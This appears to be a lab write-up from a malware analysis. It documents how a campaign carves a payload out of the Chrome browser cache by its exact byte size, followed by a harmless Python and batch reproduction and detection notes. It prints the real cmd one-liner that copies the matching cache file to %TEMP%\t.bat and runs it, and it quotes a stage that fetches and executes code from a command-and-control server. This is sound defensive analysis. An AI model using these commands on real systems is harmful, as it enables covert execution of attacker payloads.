# Lab Run — How the Size-Match Extraction Works

This documents an **actual sandbox run** of the campaign's cache-carve *mechanic*, reproduced
benignly (no malware, no network, no execution of any real payload). It answers "run it so we
document how the code works" for the one novel, safe-to-reproduce part of the chain: **locating
the payload in the browser cache by its exact byte size.**

> **What is deliberately NOT run:** the real chain's next step — `stage2.ps1` doing
> `irm <C2>; iex` — fetches and executes live attacker code from a command-and-control
> server. That is malware detonation and is out of scope. We reproduce the *selection* logic,
> which is where the cleverness lives, and stop before execution. See
> [Appendix E §E.3–E.4](../appendix-e-frames.md) for the static analysis of the parts we don't run.

## The real command (annotated, not run)

```bat
cmd /c for /r "%LOCALAPPDATA%\Google\Chrome\User Data" %f in (f_*) do ^
   @if %~zf==17635 copy "%f" %TEMP%\t.bat >nul 2>nul && %TEMP%\t.bat
                                                        └────────────┘ execution — omitted in the lab
```

- `for /r … (f_*)` — walk every `f_######` browser-cache entry.
- `%~zf` — the current file's **size in bytes**.
- `@if %~zf==17635` — match **only** the file that is exactly 17,635 bytes (the seeded batch).
- `copy … %TEMP%\t.bat` — carve it out to a runnable `.bat`.
- `&& %TEMP%\t.bat` — run it (**not** reproduced here).

## The benign reproduction

Two equivalent, harmless implementations are provided:

| File | Platform | What it does |
|------|----------|--------------|
| [`size_match_demo.py`](size_match_demo.py) | any (Python) | seeds a fake cache, carves by size, **prints** the match |
| [`size_match_demo.bat`](size_match_demo.bat) | Windows | same logic in native `cmd` `for /r … %~zf` — prints, never executes |

Run it:
```bash
python3 size_match_demo.py         # cross-platform
# or on Windows:  size_match_demo.bat
```

## The captured run

Real output from this environment (screenshot:
[`../screenshots/06-lab-size-match-carve.png`](../screenshots/06-lab-size-match-carve.png)):

```
[demo] cache entries (name -> size):
          f_000000  2048
          f_000001  512
          f_000004  17636          <- near miss (off by one)
          f_000005  65536
          f_000583  17635  <-- exact match target
[demo] running size-match carve for %~zf==17635 ...
[demo] MATCH: f_000583 == 17635 bytes
[demo] copied to: .fake-cache/t.bat  (stands in for %TEMP%\t.bat)
[demo] NOTE: no download, no network, no execution. Selection was by SIZE alone.
```

## What the run proves

1. **Size is a sufficient selector.** Among decoys — including deliberate **off-by-one**
   neighbours at 17,634 and 17,636 bytes — only the exact 17,635-byte file is chosen. The
   attacker never needs a marker string or a filename; the seeded payload's precise length
   is the address.
2. **No network is involved at carve time.** The bytes were already on disk (the browser
   cached them earlier as an "image"); the carve is a pure local file operation. This is why
   run-time network monitoring sees nothing.
3. **The detection surface is the behaviour, not a download.** A process enumerating
   `Cache_Data` with a hard-coded `%~zf==<size>` test, spawned from `explorer.exe`, writing
   `%TEMP%\t.bat`, is the signal — see [Appendix B](../appendix-b-detection.md) R1–R3.

## Cleanup

Runtime artifacts (`.fake-cache/`, `.fake-cache-run.txt`) are git-ignored; this writeup and
the committed screenshot are the durable record.
